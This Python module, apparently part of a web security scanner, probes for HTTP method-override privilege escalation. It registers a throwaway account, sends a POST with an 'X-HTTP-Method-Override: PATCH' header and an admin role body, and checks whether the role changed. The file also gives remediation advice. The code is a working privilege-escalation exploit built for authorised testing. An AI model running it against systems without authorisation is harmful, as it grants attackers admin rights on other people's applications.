#!/usr/bin/env python3
# Author: Tim Rice <tim.j.rice@hackrange.com>
# Part of nextgen-dast. See README.md for license and overall architecture.
"""
Authorization: HTTP method-override smuggles a privileged PATCH
through a permissive POST.

A reverse proxy / WAF rule that gates `PATCH` on admin role but lets
`POST` through to the same controller is the textbook setup for this
bug. Many frameworks (Express's `method-override`, Spring's
`HiddenHttpMethodFilter`) honor an `X-HTTP-Method-Override` header
and re-dispatch the request as the named method — bypassing the
upstream method-based gate.

Detection signal:
  Register and log in as a regular user. Send `POST /api/Users/<own_id>`
  with header `X-HTTP-Method-Override: PATCH` and body `{"role":"admin"}`.
  Then GET the same /api/Users/<own_id> and confirm role is now admin.

This is destructive (we mutate our own role on a real account that
persists). Off by default; require `--allow-destroy`.

Tested against:
  + OWASP Juice Shop  PATCH on /api/Users updates role for non-admin;
                      method-override is a viable smuggle path on
                      configurations that gate only PATCH at the
                      proxy → validated=True / False per build.
  + nginx default site → validated=False
"""
from __future__ import annotations

import json
import secrets
import sys
from pathlib import Path
from urllib.parse import urljoin, urlparse

sys.path.insert(0, str(Path(__file__).parent.parent))
from lib import Probe, Verdict, SafeClient   # noqa: E402

USERS_PATH = "/api/Users/{id}"


def _register_and_login(client: SafeClient, origin: str) -> dict:
    email = f"method-override-{secrets.token_hex(6)}@dast.test"
    pw    = "Pr0be-" + secrets.token_hex(4)
    out: dict = {"email": email, "password": pw,
                 "token": None, "user_id": None, "user_email": email}
    body = json.dumps({"email": email, "password": pw,
                       "passwordRepeat": pw,
                       "securityQuestion": {"id": 1},
                       "securityAnswer": "probe"}).encode()
    r = client.request("POST", urljoin(origin, "/api/Users"),
                       headers={"Content-Type": "application/json"},
                       body=body)
    out["register_status"] = r.status
    if r.status in (200, 201) and r.body:
        try:
            doc = json.loads(r.text)
            data = doc.get("data") if isinstance(doc, dict) else None
            uid = (data or {}).get("id") if isinstance(data, dict) else None
            out["user_id"] = uid
        except json.JSONDecodeError:
            pass

    body = json.dumps({"email": email, "password": pw}).encode()
    r = client.request("POST", urljoin(origin, "/rest/user/login"),
                       headers={"Content-Type": "application/json"},
                       body=body)
    out["login_status"] = r.status
    if r.status == 200 and r.body:
        try:
            doc = json.loads(r.text) or {}
            auth = doc.get("authentication") or {}
            out["token"] = auth.get("token")
            if out["user_id"] is None:
                out["user_id"] = auth.get("uid") or auth.get("id")
        except json.JSONDecodeError:
            pass
    return out


class MethodOverrideAdminProbe(Probe):
    name = "authz_method_override_admin"
    summary = ("Detects HTTP method-override smuggling — POST + "
               "X-HTTP-Method-Override: PATCH bypasses a method-based "
               "authz gate.")
    safety_class = "destructive"

    def add_args(self, parser):
        parser.add_argument(
            "--allow-destroy", action="store_true",
            help="Required — the probe mutates the throwaway user's "
                 "role to confirm the override took effect.")

    def run(self, args, client: SafeClient) -> Verdict:
        if not args.url:
            return Verdict(ok=False, error="--url is required")
        parsed = urlparse(args.url)
        origin = f"{parsed.scheme}://{parsed.netloc}"
        if not getattr(args, "allow_destroy", False):
            return Verdict(
                validated=None, confidence=0.0,
                summary=("Skipped: probe mutates the throwaway user "
                         "record. Re-run with --allow-destroy."),
                evidence={"origin": origin, "safety_skipped": True},
            )
        sess = _register_and_login(client, origin)
        if not sess.get("token") or not sess.get("user_id"):
            return Verdict(
                validated=False, confidence=0.6,
                summary=f"Inconclusive: no probe session on {origin}.",
                evidence={"origin": origin,
                          "session": {k: v for k, v in sess.items()
                                      if k != "password"}},
            )
        token = sess["token"]
        uid   = sess["user_id"]
        url = urljoin(origin, USERS_PATH.format(id=uid))
        body = json.dumps({"role": "admin"}).encode()

        # Smuggled write: POST + override header.
        r = client.request("POST", url, headers={
            "Authorization": f"Bearer {token}",
            "Content-Type": "application/json",
            "X-HTTP-Method-Override": "PATCH",
        }, body=body)
        write_attempt = {"step": "smuggle-write", "status": r.status,
                         "size": r.size,
                         "body_excerpt": (r.text or "")[:200]}

        # Verify: GET the user and confirm role is now admin.
        r2 = client.request("GET", url, headers={
            "Authorization": f"Bearer {token}",
        })
        read_attempt = {"step": "verify-read", "status": r2.status,
                        "size": r2.size,
                        "body_excerpt": (r2.text or "")[:200]}
        confirmed = False
        if r2.status == 200 and r2.body:
            try:
                doc = json.loads(r2.text)
                data = doc.get("data") if isinstance(doc, dict) else None
                role = (data or {}).get("role") if isinstance(data, dict) else None
                if isinstance(role, str) and role.lower() == "admin":
                    confirmed = True
                    read_attempt["effective_role"] = role
            except json.JSONDecodeError:
                pass

        evidence = {"origin": origin, "session_email": sess.get("user_email"),
                    "user_id": uid, "attempts": [write_attempt, read_attempt]}
        if confirmed:
            return Verdict(
                validated=True, confidence=0.95,
                summary=(f"Confirmed: method-override smuggle on "
                         f"{origin}{USERS_PATH.format(id=uid)} — POST + "
                         "X-HTTP-Method-Override: PATCH escalated the "
                         "throwaway user to admin."),
                evidence=evidence,
                severity_uplift="critical",
                remediation=(
                    "Disable HTTP method override entirely (it is a "
                    "legacy compatibility feature that no modern client "
                    "needs). If the upstream proxy does method-based "
                    "authz, also enforce the same rule at the "
                    "application layer — the proxy and the framework "
                    "must AGREE on the request method, not just one or "
                    "the other.\n"
                    "Express: do not register `method-override`. Spring: "
                    "remove `HiddenHttpMethodFilter` from the chain."),
            )
        return Verdict(
            validated=False, confidence=0.85,
            summary=(f"Refuted: method-override smuggle on "
                     f"{origin}{USERS_PATH.format(id=uid)} did not "
                     "escalate the throwaway user."),
            evidence=evidence,
        )


if __name__ == "__main__":
    MethodOverrideAdminProbe().main()
